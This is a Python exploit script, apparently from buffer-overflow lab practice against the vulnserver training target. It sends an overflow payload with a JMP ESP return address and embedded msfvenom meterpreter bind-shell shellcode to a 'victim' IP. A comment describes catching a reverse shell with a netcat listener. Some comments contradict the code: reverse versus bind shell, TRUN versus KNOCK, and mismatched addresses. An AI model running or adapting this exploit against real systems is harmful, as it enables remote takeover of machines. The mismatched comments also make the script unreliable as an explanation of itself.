# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '192.168.7.81'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.7.81 LPORT=11111 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a'
SHELL =  b""
SHELL += b"\xbb\x82\x2d\xec\xaa\xda\xd8\xd9\x74\x24\xf4\x5e"
SHELL += b"\x29\xc9\xb1\x57\x31\x5e\x15\x83\xc6\x04\x03\x5e"
SHELL += b"\x11\xe2\x77\xd1\x04\x25\x77\x2a\xd5\x5a\x46\xf8"
SHELL += b"\x5c\x7f\xcc\x77\x0c\xb0\x87\xda\xbd\x3b\xc5\xce"
SHELL += b"\xb2\x8c\xa3\xc8\xfd\x0d\xb8\x67\xd6\xc0\x7e\x2b"
SHELL += b"\x1a\x42\x02\x36\x4f\xa4\x3b\xf9\x82\xa5\x7c\x4f"
SHELL += b"\xe8\x4a\xd0\xdb\x40\x85\x5f\x99\x58\xa4\x8f\x95"
SHELL += b"\xe1\xde\xaa\x6a\xb6\x6a\xf8\x6b\xe9\x18\x48\x74"
SHELL += b"\x82\x47\x68\x85\x47\x27\xed\x4c\x13\xf4\xdc\xb1"
SHELL += b"\x95\x8f\x2a\xc5\x27\x46\x63\x19\x8b\xa7\x4c\x94"
SHELL += b"\xd5\xe0\x6a\x47\xa0\x1a\x89\xfa\xb3\xd8\xf0\x20"
SHELL += b"\x31\xff\x52\xa2\xe1\xdb\x63\x67\x77\xaf\x6f\xcc"
SHELL += b"\xf3\xf7\x73\xd3\xd0\x83\x8f\x58\xd7\x43\x06\x1a"
SHELL += b"\xfc\x47\x43\xf8\x9d\xde\x29\xaf\xa2\x01\x95\x10"
SHELL += b"\x07\x49\x37\x46\x37\xb2\xc8\x67\x65\x25\x05\xaa"
SHELL += b"\x96\xb5\x01\xbd\xe5\x87\x8e\x15\x62\xa4\x47\xb0"
SHELL += b"\x75\xcb\x72\x04\xe9\x32\x7c\x75\x23\xf1\x28\x25"
SHELL += b"\x5b\xd0\x50\xae\x9b\xdd\x85\x5b\x97\x78\x75\x7e"
SHELL += b"\x5a\x10\x74\x14\xa7\x8d\x9c\xe7\x78\xad\x9f\x2d"
SHELL += b"\x11\x46\x5d\xce\x35\xf0\xe8\x28\x23\xee\xbc\xe3"
SHELL += b"\xdc\xcc\x9b\x3b\x7a\x2e\xce\xc1\x44\xdf\x75\x91"
SHELL += b"\x44\xe0\x75\x75\x2d\x57\x9c\x41\x52\x68\x8b\xe5"
SHELL += b"\xc4\xe3\xdf\x31\xf4\xf3\xca\x11\x61\x63\x81\xf3"
SHELL += b"\xc0\x15\x96\xd9\xb1\xd5\x02\xe6\x13\x81\xba\xe4"
SHELL += b"\x42\xe5\x65\x16\xa1\x75\x61\xe8\x34\x57\x1a\xdf"
SHELL += b"\xa2\xe7\x74\x20\x23\xe8\x84\x76\x29\xe8\xec\x2e"
SHELL += b"\x09\xbb\x09\x31\x84\xaf\x82\xa4\x27\x86\x77\x6e"
SHELL += b"\x40\x24\xae\x58\xcf\xd7\x85\xda\x08\x27\x5b\xda"
SHELL += b"\xe9\xeb\x8a\x22\x9c\x02\x0f\x11\xbf\xc8\xa5\x6c"
SHELL += b"\x28\x55\x2c\xcd\x35\x66\x9b\x12\x40\xe5\x29\xeb"
SHELL += b"\xb7\xf5\x58\xee\xfc\xb1\xb1\x82\x6d\x54\xb5\x31"
SHELL += b"\x8d\x7d"


# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
